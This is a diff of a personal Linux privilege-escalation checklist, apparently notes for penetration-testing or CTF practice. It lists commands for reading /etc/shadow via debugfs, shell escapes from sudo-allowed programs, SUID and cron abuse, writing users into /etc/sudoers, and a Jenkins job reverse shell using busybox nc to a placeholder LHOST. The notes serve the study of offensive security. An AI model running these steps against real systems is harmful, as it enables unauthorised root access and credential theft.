@@ -2,8 +2,8 @@
 #### SOP for Linux 
 
 1. Disk group: id => `debugfs -w /dev/sdaX` then `cat /etc/shadow`, `getent group` for other groups 
-2. Check `sudo -l` , su , env ~ (eg env, apt-get, if 'less' then `!sh`) 
-3. SUID `find / -perm -4000 -type f 2>/dev/null` = GTFObins (eg find, strace, gcore, wget, rsync) 
+2. Check `sudo -l` , su , env ~ (eg env, apt-get, if 'less' then `!sh`, systemctl check service writable!) 
+3. SUID `find / -perm -4000 -type f 2>/dev/null` = just whack everyone in GTFObins (eg find, strace, gcore, wget, rsync) 
 4. Find writable files `find . -type f -writable 2>/dev/null` (eg /etc/passwd then update user to root group) 
 5. Cron in /etc/crontab ; PATH has /dev/shm , /usr/local/bin , & so on? Job is writable? 
 6. Find creds in /var/www , databases like *.db 
@@ -20,10 +20,10 @@
 - Python asgi rpc exploit = https://github.com/CSpanias/rpc-rce.py 
 
 - If custom binary try `ls -al` and `--help` ; if * in custom path try ../../ too. 
+- If old kernel and `gcc` installed, try kernel exploits (look under linpeas -> Linux Exploit Suggester) 
 - Jenkins build job = `busybox nc {{LHOST}} {{LPORT}} -e /bin/sh` 
 - Create Makefile to add user to sudo group or /etc/sudoers, run make install, `exec su -l user` 
 - Cron job needs some 'utils.so' (check PATH), **compile** and put in /usr/local/lib/dev 
 > Just whack the user into `/etc/sudoers` when unsure. 
-
 
 
